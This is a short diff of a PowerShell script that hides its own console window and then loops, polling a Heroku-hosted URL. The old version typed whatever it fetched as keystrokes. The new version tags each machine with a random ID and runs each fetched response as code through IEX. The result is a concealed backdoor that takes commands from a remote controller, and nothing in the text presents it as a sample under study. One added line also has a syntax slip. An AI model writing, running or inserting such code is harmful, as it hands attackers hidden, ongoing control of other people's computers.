@@ -9,4 +9,16 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-$ps = "";$wshell = New-Object -ComObject wscript.shell;while (1) {$s = (New-Object System.Net.WebClient).DownloadString("http://zochg.herokuapp.com/pps");if ($s -ne $ps) {$wshell.sendKeys($s); $ps = $s};sleep 1}
+$ps = "";
+$id = Get-Random
+$wshell = New-Object -ComObject wscript.shell;
+while (1) 
+{
+$s = (New-Object System.Net.WebClient).DownloadString("http://zochg.herokuapp.com/rs/listen/" + $id);
+if ($s -ne $ps) 
+{
+IEX $s
+ps = $s
+};
+sleep 1
+}
